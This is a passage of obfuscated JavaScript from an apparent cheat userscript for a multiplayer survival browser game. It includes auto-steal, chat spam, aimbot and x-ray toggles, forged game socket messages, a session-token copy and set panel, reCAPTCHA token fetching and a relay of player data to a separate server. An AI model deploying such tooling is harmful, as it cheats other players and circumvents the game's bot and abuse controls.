        j.addButton({
          title: "ADD ➕"
        }).on("click", e => {
          if (!a0JUMPfile.AutoTakeChest.invIds.includes(a0DRAWbuffer.invIdToTake)) {
            a0JUMPfile.AutoTakeChest.invIds.push(a0DRAWbuffer.invIdToTake);
            a0DEFErloop.saveSettings();
          }
        });
        j.addButton({
          title: "RESET 🔄"
        }).on("click", e => {
          a0JUMPfile.AutoTakeChest.invIds = [];
          a0DEFErloop.saveSettings();
        });
        j.addButton({
          title: "ADD Stone🪨 + Gold🟨 + Diamond🔷"
        }).on("click", e => {
          if (!a0JUMPfile.AutoTakeChest.invIds.includes(a0CONNectloop.STONE)) {
            a0JUMPfile.AutoTakeChest.invIds.push(a0CONNectloop.STONE);
          }
          if (!a0JUMPfile.AutoTakeChest.invIds.includes(a0CONNectloop.GOLD)) {
            a0JUMPfile.AutoTakeChest.invIds.push(a0CONNectloop.GOLD);
          }
          if (!a0JUMPfile.AutoTakeChest.invIds.includes(a0CONNectloop.DIAMOND)) {
            a0JUMPfile.AutoTakeChest.invIds.push(a0CONNectloop.DIAMOND);
          }
          a0DEFErloop.saveSettings();
        });
        j.addBlade({
          view: "separator"
        });
        j.addBinding(a0JUMPfile.AutoPutChest, "e", {
          label: "PutChest"
        }).on("change", e => {
          a0DEFErloop.saveSettings();
        });
        j.addBinding(a0DRAWbuffer, "invIdToPut", {
          label: "└─ invId",
          min: 0,
          max: 355,
          step: 1
        }).on("change", e => {
          a0JUMPfile.ChestInfo.isShowInvId = true;
          if (a0DEFInestate) {
            workerTimers.clearTimeout(a0DEFInestate);
          }
          a0DEFInestate = workerTimers.setTimeout(() => {
            a0JUMPfile.ChestInfo.isShowInvId = false;
            a0DEFInestate = null;
          }, 10000);
        });
        j.addButton({
          title: "ADD ➕"
        }).on("click", e => {
          if (!a0JUMPfile.AutoPutChest.invIds.includes(a0DRAWbuffer.invIdToPut)) {
            a0JUMPfile.AutoPutChest.invIds.push(a0DRAWbuffer.invIdToPut);
            a0DEFErloop.saveSettings();
          }
        });
        j.addButton({
          title: "RESET 🔄"
        }).on("click", e => {
          a0JUMPfile.AutoPutChest.invIds = [];
          a0DEFErloop.saveSettings();
        });
        j.addButton({
          title: "ADD Stone🪨 + Gold🟨 + Diamond🔷"
        }).on("click", e => {
          if (!a0JUMPfile.AutoPutChest.invIds.includes(a0CONNectloop.STONE)) {
            a0JUMPfile.AutoPutChest.invIds.push(a0CONNectloop.STONE);
          }
          if (!a0JUMPfile.AutoPutChest.invIds.includes(a0CONNectloop.GOLD)) {
            a0JUMPfile.AutoPutChest.invIds.push(a0CONNectloop.GOLD);
          }
          if (!a0JUMPfile.AutoPutChest.invIds.includes(a0CONNectloop.DIAMOND)) {
            a0JUMPfile.AutoPutChest.invIds.push(a0CONNectloop.DIAMOND);
          }
          a0DEFErloop.saveSettings();
        });
      }
    }
    let x = a0INSErtpolicy.addFolder({
      title: "🌀 Misc",
      expanded: false
    });
    {
      let K = x;
      let w = K.addButton({
        title: a0JUMPfile.BulkItems.k,
        label: "putManyItems"
      }).on("click", e => {
        a0DEFErloop.controls.setKeyBind("BulkItems", w);
      });
      K.addBinding(a0JUMPfile.BulkItems, "amount", {
        label: "└─ Amount",
        min: 50,
        max: 2000,
        step: 50
      }).on("change", e => {
        a0DEFErloop.saveSettings();
      });
      K.addBinding(a0JUMPfile.SpamChat, "e", {
        label: "SpamChat 💬"
      });
      K.addBinding(a0JUMPfile.SpamChat, "message", {
        label: "└─ Message"
      }).on("change", e => {
        a0DEFErloop.saveSettings();
      });
      K.addBinding(a0JUMPfile.AutoFood, "e", {
        label: "AutoFood"
      }).on("change", e => {
        a0DEFErloop.saveSettings();
      });
      K.addBinding(a0JUMPfile.AutoDrink, "autoEatWatermelon", {
        label: "Auto 🍉"
      }).on("change", e => {
        a0DEFErloop.saveSettings();
      });
      K.addBinding(a0JUMPfile.AutoDiving, "e", {
        label: "AutoDiving 🤿"
      }).on("change", e => {
        a0DEFErloop.saveSettings();
      });
      K.addBinding(a0JUMPfile.AutoPilot, "e", {
        label: "AutoPilot ✈️"
      }).on("change", e => {
        a0DEFErloop.saveSettings();
      });
      K.addBinding(a0JUMPfile.AutoPirateHat, "e", {
        label: "autoPirHat 🏴‍☠️"
      }).on("change", e => {
        a0DEFErloop.saveSettings();
      });
      K.addBinding(a0JUMPfile.AutoTame, "e", {
        label: "AutoTame 🐼"
      }).on("change", e => {
        a0DEFErloop.saveSettings();
      });
      K.addBinding(a0JUMPfile.AntiHood, "e", {
        label: "AntiHood (Pitchfork)"
      }).on("change", e => {
        a0DEFErloop.saveSettings();
      });
      let J = K.addButton({
        title: a0JUMPfile.DropWeapon.k,
        label: "DropWeapon"
      }).on("click", e => {
        a0DEFErloop.controls.setKeyBind("DropWeapon", J);
      });
      let z = K.addButton({
        title: a0JUMPfile.AutoFire.k,
        label: "AutoFire 🔥"
      }).on("click", e => {
        a0DEFErloop.controls.setKeyBind("AutoFire", z);
      });
      let F = K.addButton({
        title: a0JUMPfile.AutoSteal.k,
        label: "AutoSteal"
      }).on("click", e => {
        a0DEFErloop.controls.setKeyBind("AutoSteal", F);
      });
      let W = K.addButton({
        title: a0JUMPfile.FakeDrop.k,
        label: "FakeDrop"
      }).on("click", e => {
        a0DEFErloop.controls.setKeyBind("FakeDrop", W);
      });
      let G = K.addButton({
        label: "AutoCraft",
        title: a0JUMPfile.AutoCraft.k
      }).on("click", () => {
        a0DEFErloop.controls.setKeyBind("AutoCraft", G);
      });
      let V = K.addButton({
        label: "AutoRecycle",
        title: a0JUMPfile.AutoRecycle.k
      }).on("click", () => {
        a0DEFErloop.controls.setKeyBind("AutoRecycle", V);
      });
      let Y = K.addButton({
        title: a0JUMPfile.AutoTotem.k,
        label: "AutoTotem 🗿"
      }).on("click", e => {
        a0DEFErloop.controls.setKeyBind("AutoTotem", Y);
      });
      let X = K.addButton({
        title: a0JUMPfile.ExitVehicle.k,
        label: "ExitVehicle 🚗"
      }).on("click", e => {
        a0DEFErloop.controls.setKeyBind("ExitVehicle", X);
      });
      let q = K.addButton({
        title: a0JUMPfile.Spectator.k,
        label: "Spectator 👀"
      }).on("click", e => {
        a0DEFErloop.controls.setKeyBind("Spectator", q);
      });
      K.addBinding(a0JUMPfile, "Equiq", {
        label: "Equiq after place"
      });
    }
    let Q = a0INSErtpolicy.addFolder({
      title: "🈳 Translator",
      expanded: false
    });
    {
      let Z = Q;
      Z.addBinding(a0JUMPfile.Translator, "OutgoingMessage", {
        label: "Your Messages"
      }).on("change", e => {
        a0DEFErloop.saveSettings();
      });
      Z.addBinding(a0JUMPfile.Translator, "TranslateTo", {
        label: "└─ Language",
        options: a0DISPatchmode
      }).on("change", e => {
        a0DEFErloop.saveSettings();
      });
      Z.addBinding(a0JUMPfile.Translator, "IncomingMessage", {
        label: "Other Messages"
      }).on("change", e => {
        a0DEFErloop.saveSettings();
      });
      Z.addBinding(a0JUMPfile.Translator, "MyLanguage", {
        label: "└─ Language",
        options: a0DISPatchmode
      }).on("change", e => {
        a0DEFErloop.saveSettings();
      });
    }
    let ee = a0INSErtpolicy.addFolder({
      title: "🌾 AutoFarm",
      expanded: false
    });
    {
      let ea = ee;
      let et = ea.addButton({
        label: "AutoFarm",
        title: a0JUMPfile.AutoFarm.k
      }).on("click", () => {
        a0DEFErloop.controls.setKeyBind("AutoFarm", et);
      });
      ea.addBinding(a0JUMPfile.AutoFarm, "e", {
        label: "Start AutoFarm"
      });
      ea.addBinding(a0JUMPfile.AutoFarm, "water", {
        label: "AutoWater 🚿"
      }).on("change", e => {
        a0DEFErloop.saveSettings();
      });
      ea.addBlade({
        view: "separator"
      });
      ea.addBinding(a0JUMPfile.AutoFarm, "dropBeri", {
        label: "AutoDrop ⬇️"
      }).on("change", e => {
        a0DEFErloop.saveSettings();
      });
      ea.addBinding(a0JUMPfile.AutoFarm, "distance", {
        label: "Distance",
        min: 200,
        max: 1000,
        step: 50
      }).on("change", e => {
        a0DEFErloop.saveSettings();
      });
      ea.addBinding(a0JUMPfile.AutoFarm, "cmd", {
        label: "Command"
      }).on("change", e => {
        a0DEFErloop.saveSettings();
      });
      ea.addBlade({
        view: "separator"
      });
      ea.addButton({
        title: "Top Left of farm"
      }).on("click", () => {
        let e = a0CLONelog.fast_units[USERTOFIX.uid];
        if (e) {
          a0JUMPfile.AutoFarm.x = e.x;
          a0JUMPfile.AutoFarm.y = e.y;
        }
        a0DEFErloop.saveSettings();
      });
      ea.addButton({
        title: "Bottom Right of farm"
      }).on("click", () => {
        let e = a0CLONelog.fast_units[USERTOFIX.uid];
        if (e) {
          a0JUMPfile.AutoFarm.xx = e.x;
          a0JUMPfile.AutoFarm.yy = e.y;
        }
        a0DEFErloop.saveSettings();
      });
      ea.addButton({
        title: "Safe Point"
      }).on("click", () => {
        let e = a0CLONelog.fast_units[USERTOFIX.uid];
        if (e) {
          a0JUMPfile.AutoFarm.sx = e.x;
          a0JUMPfile.AutoFarm.sy = e.y;
        }
        a0DEFErloop.saveSettings();
      });
      ea.addBlade({
        view: "separator"
      });
      ea.addBinding(a0JUMPfile.AutoFarm, "isPutBerryToChest", {
        label: "isPutBerryToChest"
      }).on("change", e => {
        a0DEFErloop.saveSettings();
      });
      ea.addBinding(a0JUMPfile.AutoFarm, "berryPutThreshold", {
        label: "berryPutThreshold",
        min: 500,
        max: 5000,
        step: 100
      }).on("change", e => {
        a0DEFErloop.saveSettings();
      });
      ea.addButton({
        title: "Set Berry Chest Position"
      }).on("change", e => {
        let t = a0CLONelog.fast_units[USERTOFIX.uid];
        if (t) {
          a0JUMPfile.AutoFarm.berryDropPositions.x = t.x;
          a0JUMPfile.AutoFarm.berryDropPositions.y = t.y;
          let i = a0CLONelog.units[a0HOOKjob.CHEST].filter(e => (!e.lock || e.ally) && a0CLONescript.dist(t, e) < 300);
          if (i.length > 0) {
            let $ = i.reduce((e, i) => a0CLONescript.dist(t, i) < a0CLONescript.dist(t, e) ? i : e, i[0]);
            a0JUMPfile.AutoFarm.chestToPutBerry.pid = $.pid;
            a0JUMPfile.AutoFarm.chestToPutBerry.id = $.id;
          }
        }
        a0DEFErloop.saveSettings();
      });
    }
    let ei = a0INSErtpolicy.addFolder({
      title: "🤖 LMBBot",
      expanded: false
    });
    {
      let e$ = ei;
      e$.addBinding(a0JUMPfile.SpikeCrafter, "e", {
        label: "SpikeCrafter"
      }).on("change", e => {
        a0DEFErloop.saveSettings();
      });
      e$.addBinding(a0JUMPfile.SpikeCrafter, "target", {
        label: "└─ target",
        options: {
          "Reditite Spike": "Reidite Spike",
          "Amethyst Spike": "Amethyst Spike",
          "Diamond Spike": "Diamond Spike",
          "Gold Spike": "Gold Spike",
          "Stone Spike": "Stone Spike",
          "Wood Spike": "Wood Spike"
        }
      });
    }
    let eo = a0INSErtpolicy.addFolder({
      title: "🌍 Community",
      expanded: false
    });
    {
      let el = eo;
      el.addBinding(a0JUMPfile.AutoBottleZMA, "e", {
        label: "AutoBottleZMA"
      }).on("change", e => {
        a0DEFErloop.saveSettings();
      });
      el.addBinding(a0JUMPfile.AutoBottleZMA, "hpForItemActivation", {
        label: "└─ hpItemUse",
        min: 20,
        max: 100,
        step: 1
      }).on("change", e => {
        a0DEFErloop.saveSettings();
      });
      el.addBinding(a0JUMPfile.AutoHamCmty, "e", {
        label: "AutoHammer (SuperHammer)"
      }).on("change", e => {
        a0DEFErloop.saveSettings();
      });
      el.addBinding(a0JUMPfile.AutoGreenCrownCmty, "e", {
        label: "AutoGreenCrown"
      }).on("change", e => {
        a0DEFErloop.saveSettings();
      });
    }
    let en = a0INSErtpolicy.addFolder({
      title: "🔑 Token",
      expanded: false
    });
    {
      let es = en;
      es.addBinding(a0JUMPfile.Token, "token", {
        label: "Token"
      });
      es.addBinding(a0JUMPfile.Token, "token_id", {
        label: "Token ID"
      });
      es.addButton({
        title: "SET Token"
      }).on("click", () => {
        a0DRAWloop();
      });
      es.addButton({
        title: "GET Token"
      }).on("click", () => {
        prompt("Copy this", "```Token: " + USERTOFIX.token + "\nTokenID: " + USERTOFIX.token_id + "```");
      });
    }
  },
  controls: null,
  controller: class {
    setKeyBind(e, t) {
      if (!a0JUMPfile[e] || a0JUMPfile[e].k === undefined) {
        console.error("Setting property \"" + e + "\" or its 'k' property not found.");
        return;
      }
      a0JUMPfile[e].k = "Press any key";
      t.title = "Press any key";
      let i = $ => {
        let o;
        o = $.code === "Escape" ? "NONE" : $.code;
        a0JUMPfile[e].k = o;
        t.title = o;
        document.removeEventListener("keydown", i);
        a0DEFErloop.saveSettings();
      };
      document.addEventListener("keydown", i);
    }
  },
  saveSettings() {
    for (let e in a0JUMPfile) {
      localStorage.setItem(e + "lmb4", JSON.stringify(a0JUMPfile[e]));
    }
  },
  loadSettings() {
    for (let e in a0JUMPfile) {
      try {
        let t = localStorage.getItem(e + "lmb4");
        if (t) {
          let i = JSON.parse(t);
          function $(e, t) {
            for (let i in e) {
              if (t.hasOwnProperty(i)) {
                if (typeof e[i] == "object" && typeof t[i] == "object") {
                  $(e[i], t[i]);
                }
              } else {
                t[i] = e[i];
              }
            }
          }
          $(a0JUMPfile[e], i);
          a0JUMPfile[e] = i;
        }
      } catch (o) {
        console.error("LMB: Failed to load setting for " + e + ":", o);
        localStorage.removeItem(e + "lmb4");
      }
    }
  },
  LoadHack() {
    a0DEFErloop.loadSettings();
    a0JUMPfile.SpamChat.e = false;
    a0JUMPfile.AutoSpike.e = false;
    a0JUMPfile.AutoWall.e = false;
    a0JUMPfile.AutoPvP.e = false;
    a0JUMPfile.AutoCraft.e = false;
    a0JUMPfile.AutoRecycle.e = false;
    a0JUMPfile.Xray.e = false;
    a0JUMPfile.AutoFarm.e = false;
    a0JUMPfile.Spectator.e = false;
    a0JUMPfile.AutoCraftSpikes.e = false;
    a0JUMPfile.AutoSteal.e = false;
    a0JUMPfile.FakeDrop.e = false;
    a0JUMPfile.AutoFire.e = false;
    a0JUMPfile.AimbotSpike.e = false;
    a0JUMPfile.AutoBuild.e = false;
    a0JUMPfile.ExitVehicle.e = false;
    a0JUMPfile.HideScript.e = false;
    a0JUMPfile.ListEnabledHacks.e = true;
    a0JUMPfile.ShowGauges.e = true;
    a0JUMPfile.ShowFPS.e = true;
    a0JUMPfile.ShowPing.e = true;
    a0JUMPfile.ColoredSpike.e = true;
    a0JUMPfile.ChestInfo.e = true;
    a0JUMPfile.Tracers.e = true;
    a0JUMPfile.Translator.e = true;
    a0JUMPfile.DrawHpInMyPlayer.e = true;
    a0JUMPfile.DrawTimerInPlayer.e = true;
    a0JUMPfile.DrawTimerInPlayer.isInMyPlayer = true;
    a0JUMPfile.DrawTimerInPlayer.isInOthers = true;
    a0JUMPfile.VisualHp.e = true;
    a0JUMPfile.VisualHp.player = true;
    a0JUMPfile.VisualHp.animal = true;
    a0JUMPfile.VisualHp.box = true;
    a0JUMPfile.HoodTimer.e = true;
    a0JUMPfile.AutoBook.e = true;
    a0JUMPfile.AutoDrink.e = true;
    a0JUMPfile.AutoKsDeadBox.e = false;
    a0JUMPfile.ChestInfo.isShowInvId = false;
    a0DEFErloop.controls = new a0DEFErloop.controller();
    a0DEFErloop.initUI(a0CACHedata[a0JUMPfile.HackTheme]);
  }
};
function a0ACCEssschema() {
  this.socket = null;
  let e = this;
  this.connect = function () {
    this.socket = new WebSocket(a0JUMPfile.lmbServerUrl + "/ws");
    this.socket.onopen = () => {
      console.log("Connected to the LMB server.");
      let t = {
        id: USERTOFIX.id,
        url: a0LISTenmessage(a0GETList.socket.url),
        team_id: a0JUMPfile.teamId,
        team: USERTOFIX.team,
        hp: USERTOFIX.gauges.l * 200
      };
      e.sendMessage("handshake", t);
    };
    this.socket.onmessage = e => {
      let t = JSON.parse(e.data);
      switch (t.type) {
        case "test":
          console.log("Server: ", t.data);
          break;
        case "hp":
          let i = t.data;
          a0GENEraterandom[id] = i.hp;
      }
    };
    this.socket.onclose = () => {
      console.log("Disconnected from the LMB server.");
      a0GENEraterandom = {};
    };
    this.socket.onerror = e => {
      console.error("LMB WebSocket Error:", e);
    };
  };
  this.sendMessage = function (e, t) {
    if (this.socket && this.socket.readyState === WebSocket.OPEN) {
      this.socket.send(JSON.stringify({
        type: e,
        data: t
      }));
    } else {
      console.error("Socket is not open.");
    }
  };
  this.send_update_hp = function (t) {
    e.sendMessage("update_hp", {
      hp: t
    });
  };
  this.send_update_team = function (t) {
    e.sendMessage("update_team", {
      new_team: t
    });
  };
  this.send_update_team_id = function (e) {
    this.sendMessage("team_id", e);
  };
}
function a0BUFFerresult(e, t) {
  if (t === "") {
    return 0;
  }
  let i = 0;
  let $ = 0;
  while (($ = e.indexOf(t, $)) !== -1) {
    i++;
    $ += t.length;
  }
  return i;
}
function a0MINIfytoken(e, t) {
  switch (e) {
    case a0CONNectloop.REIDITE_SPEAR:
    case a0CONNectloop.CRAB_SPEAR:
    case a0CONNectloop.AMETHYST_SPEAR:
    case a0CONNectloop.DIAMOND_SPEAR:
    case a0CONNectloop.GOLD_SPEAR:
    case a0CONNectloop.STONE_SPEAR:
    case a0CONNectloop.WOOD_SPEAR:
    case a0CONNectloop.DRAGON_SPEAR:
    case a0CONNectloop.LAVA_SPEAR:
    case a0CONNectloop.COPPER_SPEAR:
    case a0CONNectloop.IRON_SPEAR:
    case a0CONNectloop.TOPAZ_SPEAR:
    case a0CONNectloop.SAPPHIRE_SPEAR:
    case a0CONNectloop.JADE_SPEAR:
    case a0CONNectloop.RUBY_SPEAR:
    case a0CONNectloop.COAL_SPEAR:
    case a0CONNectloop.AQUAMARINE_SPEAR:
    case a0CONNectloop.EMERALD_SPEAR:
      return 2;
    case a0CONNectloop.WOOD_SWORD:
    case a0CONNectloop.STONE_SWORD:
    case a0CONNectloop.COPPER_SWORD:
    case a0CONNectloop.IRON_SWORD:
    case a0CONNectloop.GOLD_SWORD:
    case a0CONNectloop.TOPAZ_SWORD:
    case a0CONNectloop.DIAMOND_SWORD:
    case a0CONNectloop.AMETHYST_SWORD:
    case a0CONNectloop.REIDITE_SWORD:
    case a0CONNectloop.PIRATE_SWORD:
    case a0CONNectloop.SAPPHIRE_SWORD:
    case a0CONNectloop.JADE_SWORD:
    case a0CONNectloop.RUBY_SWORD:
    case a0CONNectloop.COAL_SWORD:
    case a0CONNectloop.AQUAMARINE_SWORD:
    case a0CONNectloop.EMERALD_SWORD:
    case a0CONNectloop.DRAGON_SWORD:
    case a0CONNectloop.LAVA_SWORD:
    case a0CONNectloop.MACHETE:
      return 1;
    case a0CONNectloop.WOOD_BOW:
    case a0CONNectloop.STONE_BOW:
    case a0CONNectloop.COPPER_BOW:
    case a0CONNectloop.IRON_BOW:
    case a0CONNectloop.GOLD_BOW:
    case a0CONNectloop.TOPAZ_BOW:
    case a0CONNectloop.DIAMOND_BOW:
    case a0CONNectloop.AMETHYST_BOW:
    case a0CONNectloop.REIDITE_BOW:
    case a0CONNectloop.SAPPHIRE_BOW:
    case a0CONNectloop.JADE_BOW:
    case a0CONNectloop.RUBY_BOW:
    case a0CONNectloop.COAL_BOW:
    case a0CONNectloop.AQUAMARINE_BOW:
    case a0CONNectloop.EMERALD_BOW:
    case a0CONNectloop.DRAGON_BOW:
      return 3;
    case a0CONNectloop.WOOD_AXE:
    case a0CONNectloop.STONE_AXE:
    case a0CONNectloop.COPPER_AXE:
    case a0CONNectloop.IRON_AXE:
    case a0CONNectloop.GOLD_AXE:
    case a0CONNectloop.TOPAZ_AXE:
    case a0CONNectloop.DIAMOND_AXE:
    case a0CONNectloop.AMETHYST_AXE:
    case a0CONNectloop.REIDITE_AXE:
    case a0CONNectloop.SAPPHIRE_AXE:
    case a0CONNectloop.JADE_AXE:
    case a0CONNectloop.RUBY_AXE:
    case a0CONNectloop.COAL_AXE:
    case a0CONNectloop.AQUAMARINE_AXE:
    case a0CONNectloop.EMERALD_AXE:
      return 4;
    case a0CONNectloop.SUPER_HAMMER:
    case a0CONNectloop.STONE_HAMMER:
    case a0CONNectloop.GOLD_HAMMER:
    case a0CONNectloop.COPPER_HAMMER:
    case a0CONNectloop.IRON_HAMMER:
    case a0CONNectloop.GOLD_HAMMER:
    case a0CONNectloop.TOPAZ_HAMMER:
    case a0CONNectloop.DIAMOND_HAMMER:
    case a0CONNectloop.AMETHYST_HAMMER:
    case a0CONNectloop.REIDITE_HAMMER:
    case a0CONNectloop.SAPPHIRE_HAMMER:
    case a0CONNectloop.JADE_HAMMER:
    case a0CONNectloop.RUBY_HAMMER:
    case a0CONNectloop.COAL_HAMMER:
    case a0CONNectloop.AQUAMARINE_HAMMER:
    case a0CONNectloop.EMERALD_HAMMER:
      if (t) {
        return 5;
      }
    case -1:
      if (t) {
        return 6;
      }
  }
  return 0;
}
function a0NAVIgatestring(e, t) {
  let i = null;
  let $ = -1;
  let o = a0MINIfytoken(e.right, false) === 2;
  for (var l = 0, n = t.length, s = null, r = null; l < n; ++l) {
    if ((s = t[l]).pid !== e.pid && !s.ally && e.fly === s.fly && !s.ghost) {
      r = (e.x - s.x) ** 2 + (e.y - s.y) ** 2;
      if (o && r < 330) {
        continue;
      }
      if ($ === -1 || r < $) {
        $ = r;
        i = s;
      }
    }
  }
  return i;
}
function a0EXTRactfolder(e, t) {
  let i = null;
  let $ = -1;
  for (var o = 0, l = t.length, n = null, s = null; o < l; ++o) {
    if ((n = t[o]).pid !== e.pid) {
      if (!n.ally && e.fly === n.fly && !n.ghost) {
        s = (e.x - n.x) ** 2 + (e.y - n.y) ** 2;
        if ($ === -1 || s < $) {
          $ = s;
          i = n;
        }
      }
    }
  }
  return i;
}
function a0MAPRoute(e, t, i) {
  let $ = [];
  let o = 0;
  for (let l = 0, n = t.length; l < n; l++) {
    let s = t[l];
    if (e.pid !== s.pid && !s.ally && e.fly === s.fly && !s.ghost && a0CLONescript.dist(e, s) <= i) {
      $[o] = s;
      o++;
    }
  }
  return $;
}
function a0FORMatdict(e) {
  let t = null;
  let i = 0;
  for (let $ = 0, o = e.length; $ < o; $++) {
    let l = e[$];
    let n = Object.values(l)[13];
    if (n > i) {
      t = l;
      i = n;
    }
  }
  return t;
}
function a0CLOSeattempt(e, t) {
  if (e.fly === 1) {
    return null;
  }
  let i = null;
  let $ = -1;
  for (var o = 0, l = t.length, n = null; o < l; ++o) {
    n = t[o];
    let s = (e.x - n.x) ** 2 + (e.y - n.y) ** 2;
    if ($ === -1 || s < $) {
      $ = s;
      i = n;
    }
  }
  return i;
}
function a0BALAnceinput(e, t) {
  var i = e.y;
  var $ = e.x;
  var o = t ? t.x : 0;
  var l = t ? t.y : 0;
  let n = 0;
  let s = e.speed * (a0BUILdresult / 1000) + 10;
  if (i < l - s && t) {
    n += 4;
  }
  if (l + s < i && t) {
    n += 8;
  }
  if ($ < o - s) {
    n += 2;
  }
  if (o + s < $) {
    n += 1;
  }
  return n;
}
function a0CLONequeue(e, t = 1) {
  let i = {
    x: e.r.x - e.r.oldX,
    y: e.r.y - e.r.oldY
  };
  let $ = Math.sqrt(i.x ** 2 + i.y ** 2);
  if ($ !== 0) {
    i.x /= $;
    i.y /= $;
  } else {
    i.x = 0;
    i.y = 0;
  }
  return {
    x: e.r.x + i.x * e.speed * (a0BUILdresult / 1000) * t,
    y: e.r.y + i.y * e.speed * (a0BUILdresult / 1000) * t
  };
}
function a0KICKport(e, t, i) {
  if (e && t) {
    if (i) {
      return Math.atan2(t.r.y - e.r.y, t.r.x - e.r.x);
    } else {
      return Math.atan2(t.y - e.y, t.x - e.x);
    }
  } else {
    return null;
  }
}
function a0KEEPtext(e) {
  for (let t = 0; t < USERTOFIX.team.length; t++) {
    if (USERTOFIX.team[t] == e) {
      return true;
    }
  }
  return 0;
}
function a0MINIfyfile() {
  let e = (e, t) => {
    e.ally = USERTOFIX.id === e.pid || a0KEEPtext(e.pid);
  };
  a0CLONelog.units[a0HOOKjob.PLAYERS].forEach(e);
  a0CLONelog.units[a0HOOKjob.SPIKE].forEach(e);
  a0CLONelog.units[a0HOOKjob.STONE_SPIKE].forEach(e);
  a0CLONelog.units[a0HOOKjob.GOLD_SPIKE].forEach(e);
  a0CLONelog.units[a0HOOKjob.DIAMOND_SPIKE].forEach(e);
  a0CLONelog.units[a0HOOKjob.AMETHYST_SPIKE].forEach(e);
  a0CLONelog.units[a0HOOKjob.REIDITE_SPIKE].forEach(e);
  a0CLONelog.units[a0HOOKjob.WOOD_DOOR].forEach(e);
  a0CLONelog.units[a0HOOKjob.WOOD_DOOR_SPIKE].forEach(e);
  a0CLONelog.units[a0HOOKjob.STONE_DOOR].forEach(e);
  a0CLONelog.units[a0HOOKjob.STONE_DOOR_SPIKE].forEach(e);
  a0CLONelog.units[a0HOOKjob.GOLD_DOOR].forEach(e);
  a0CLONelog.units[a0HOOKjob.GOLD_DOOR_SPIKE].forEach(e);
  a0CLONelog.units[a0HOOKjob.DIAMOND_DOOR].forEach(e);
  a0CLONelog.units[a0HOOKjob.DIAMOND_DOOR_SPIKE].forEach(e);
  a0CLONelog.units[a0HOOKjob.AMETHYST_DOOR].forEach(e);
  a0CLONelog.units[a0HOOKjob.AMETHYST_DOOR_SPIKE].forEach(e);
  a0CLONelog.units[a0HOOKjob.REIDITE_DOOR].forEach(e);
  a0CLONelog.units[a0HOOKjob.REIDITE_DOOR_SPIKE].forEach(e);
  a0CLONelog.units[a0HOOKjob.CHEST].forEach(e);
}
function a0HYDRaterandom(e, t) {
  if (t === 0) {
    return;
  }
  let i;
  switch (e) {
    case "Wood":
      i = Math.floor(t / 3);
      for (let $ = 0; $ < Math.floor(i / 83); $++) {
        a0GETList.socket.send(JSON.stringify([22, 83, 0]));
      }
      a0GETList.socket.send(JSON.stringify([22, i % 83, 0]));
      break;
    case "Stone":
      i = Math.round(t / 4);
      for (let o = 0; o < Math.floor(i / 62); o++) {
        a0GETList.socket.send(JSON.stringify([22, 62, 1]));
      }
      a0GETList.socket.send(JSON.stringify([22, i % 62, 1]));
      break;
    case "Gold":
      i = Math.round(t / 6);
      for (let l = 0; l < Math.floor(i / 41); l++) {
        a0GETList.socket.send(JSON.stringify([22, 41, 2]));
      }
      a0GETList.socket.send(JSON.stringify([22, i % 41, 2]));
      break;
    case "Diamond":
      i = Math.round(t / 0.25);
      for (let n = 0; n < Math.floor(i / 252); n++) {
        a0GETList.socket.send(JSON.stringify([22, 252, 3]));
      }
      a0GETList.socket.send(JSON.stringify([22, i % 252, 3]));
      break;
    case "Amethyst":
      i = Math.round(t / 0.125);
      for (let s = 0; s < Math.floor(i / 248); s++) {
        a0GETList.socket.send(JSON.stringify([22, 248, 4]));
      }
      a0GETList.socket.send(JSON.stringify([22, i % 248, 4]));
      break;
    case "Reidite":
      i = Math.round(t / 0.0625);
      for (let r = 0; r < Math.floor(i / 240); r++) {
        a0GETList.socket.send(JSON.stringify([22, 240, 5]));
      }
      a0GETList.socket.send(JSON.stringify([22, i % 240, 5]));
  }
}
function a0CACHebool() {
  a0JUMPfile.Market.forestCast.wood = USERTOFIX.inv.n[a0CONNectloop.BERRY] * 3;
  a0JUMPfile.Market.forestCast.stone = USERTOFIX.inv.n[a0CONNectloop.PUMPKIN] * 4;
  a0JUMPfile.Market.forestCast.gold = USERTOFIX.inv.n[a0CONNectloop.BREAD] * 6;
  a0JUMPfile.Market.forestCast.diamond = Math.floor(USERTOFIX.inv.n[a0CONNectloop.CARROT] / 4);
  a0JUMPfile.Market.forestCast.amethyst = Math.floor(USERTOFIX.inv.n[a0CONNectloop.TOMATO] / 8);
  a0JUMPfile.Market.forestCast.reidite = Math.floor(USERTOFIX.inv.n[a0CONNectloop.THORNBUSH] / 16);
}
const a0INITdisk = () => new Promise((e, t) => {
  grecaptcha.ready(function () {
    grecaptcha.execute("6LdvBaEjAAAAAIKTgdecsZBehRxhVZOIDzG9MvXg", {
      action: "validate_recaptcha"
    }).then(function (t) {
      e(t);
    }).catch(e => {
      console.log(e);
      t(e);
    });
  });
});
let a0CLONescript = {
  get_recaptcha_token: a0INITdisk,
  open_in_new_tab: function (e) {
    unsafeWindow.open(e, "_blank").focus();
  },
  open_in_new_box: function (e) {
    unsafeWindow.open(e, "_blank", "location=yes,height=570,width=520,scrollbars=yes,status=yes");
  },
  compare_object: function (e, t) {
    for (var i in e) {
      if (e[i] != t[i]) {
        return false;
      }
    }
    return true;
  },
  compare_array: function (e, t) {
    if (e.length != t.length) {
      return false;
    }
    for (var i = 0; i < e.length; i++) {
      if (typeof e == "object") {
        if (!this.compare_object(e[i], t[i])) {
          return false;
        }
      } else if (e[i] != t[i]) {
        return false;
      }
    }
    return true;
  },
  copy_vector: function (e, t) {
    t.x = e.x;
    t.y = e.y;
  },
  get_vector: function (e, t) {
    return {
      x: e.x - t.x,
      y: e.y - t.y
    };
  },
  mul_vector: function (e, t) {
    e.x *= t;
    e.y *= t;
  },
  scalar_product: function (e, t) {
    return e.x * t.x + e.y * t.y;
  },
  norm: function (e) {
    return Math.sqrt(e.x * e.x + e.y * e.y);
  },
  sign: function (e) {
    if (e < 0) {
      return -1;
    } else {
      return 1;
    }
  },
  cross_product: function (e, t) {
    return e.x * t.y - e.y * t.x;
  },
  get_angle_2: function (e, t, i, $) {
    return Math.atan2($ - t, i - e);
  },
  get_angle: function (e, t) {
    return Math.acos(this.scalar_product(e, t) / (this.norm(e) * this.norm(t))) * this.sign(this.cross_product(e, t));
  },
  getURLData: function (e) {
    _url = location.href;
    if ((e = RegExp("[\\?&]" + (e = e.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]")) + "=([^&#]*)").exec(_url)) === null) {
      return null;
    } else {
      return e[1];
    }
  },
  reduceAngle: function (e, t) {
    var i = Math.PI * 2;
    if (Math.abs(e - (t = (t % i + i) % i)) > Math.PI) {
      if (e > t) {
        return t + i;
      } else {
        return t - i;
      }
